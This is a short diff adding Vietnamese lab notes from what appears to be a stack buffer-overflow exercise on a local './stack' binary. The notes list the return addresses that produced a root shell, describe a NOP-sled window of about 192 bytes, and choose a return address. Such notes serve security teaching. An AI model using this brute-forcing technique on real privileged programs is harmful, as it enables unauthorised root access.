@@ -1,0 +1,11 @@
+# Quet thu nghiem: moi gia tri ret -> chay ./stack, kiem tra uid=0
+$ for ret in 0xffffc640 .. 0xffffc860; do thu(ret); done
+
+Cac ret CHO ROOT SHELL (uid=0):
+0xffffc7a0 0xffffc7a8 0xffffc7b0 0xffffc7b8 0xffffc7c0 0xffffc7c8
+0xffffc7d0 0xffffc7d8 0xffffc7e0 0xffffc7e8 0xffffc7f0 0xffffc7f8
+0xffffc808 0xffffc810 0xffffc818 0xffffc820 0xffffc828 0xffffc830
+0xffffc838 0xffffc840 0xffffc848 0xffffc850 0xffffc858 0xffffc860
+
+=> Cua so hoat dong rong ~192 byte (NOP sled hap thu sai so dia chi)
+=> Chon ret = 0xffffc7d0 (giua cua so) cho on dinh
